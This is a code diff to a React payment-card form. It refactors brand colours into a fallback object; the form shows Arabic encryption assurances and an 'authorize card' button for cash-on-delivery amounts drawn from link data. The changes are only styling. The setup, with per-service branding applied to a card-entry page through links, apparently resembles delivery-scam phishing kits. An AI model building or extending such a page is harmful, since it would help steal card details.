@@ -29,6 +29,18 @@ const PaymentCardForm = () => {
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
 
+  const colors = {
+    primary: branding.colors?.primary || "#CE1126",
+    secondary: branding.colors?.secondary || "#00732F",
+    accent: branding.colors?.accent || "#000000",
+    background: branding.colors?.background || "#FFFFFF",
+    surface: branding.colors?.surface || "#F5F5F5",
+    border: branding.colors?.border || "#E0E0E0",
+    text: branding.colors?.text || "#000000",
+    textLight: branding.colors?.textLight || "#666666",
+    textOnPrimary: branding.colors?.textOnPrimary || "#FFFFFF",
+  };
+
   // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
 
@@ -149,11 +161,11 @@ const PaymentCardForm = () => {
       <div 
         className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
         style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
+          background: `${colors.primary}10`,
+          border: `1px solid ${colors.primary}30`
         }}
       >
-        <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
+        <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: colors.primary }} />
         <p className="text-xs sm:text-sm">
           بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
         </p>
@@ -163,7 +175,7 @@ const PaymentCardForm = () => {
       <div 
         className="rounded-2xl p-5 sm:p-6 mb-6 relative overflow-hidden shadow-lg"
         style={{
-          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+          background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`,
           minHeight: '180px'
         }}
       >
@@ -297,7 +309,7 @@ const PaymentCardForm = () => {
           size="lg"
           className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+            background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`
           }}
         >
           <span className="ml-2">تفويض البطاقة</span>
